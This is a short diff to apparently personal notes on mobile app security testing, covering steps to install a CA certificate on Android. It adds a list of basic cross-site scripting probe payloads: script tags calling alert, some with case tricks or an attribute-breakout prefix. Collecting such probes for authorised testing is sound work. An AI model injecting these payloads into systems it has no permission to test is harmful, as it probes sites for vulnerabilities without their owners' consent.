@@ -48,3 +48,14 @@ Mobile App Testing Approach (static and dynamic)
            b. download ca certificate 
            c. sd card storage rename with extenstion .cer
            d. In settings go security - install from storage device.  
+           
+          <script>alert(123);</script>
+<ScRipT>alert("XSS");</ScRipT>
+<script>alert(123)</script>
+<script>alert("hellox worldss");</script>
+<script>alert('XSS')</script> 
+<script>alert('XSS');</script>
+<script>alert('XSS')</script>
+'><script>alert('XSS')</script>
+<script>alert(/XSS/)</script>
+<script>alert(/XSS/)</script> 
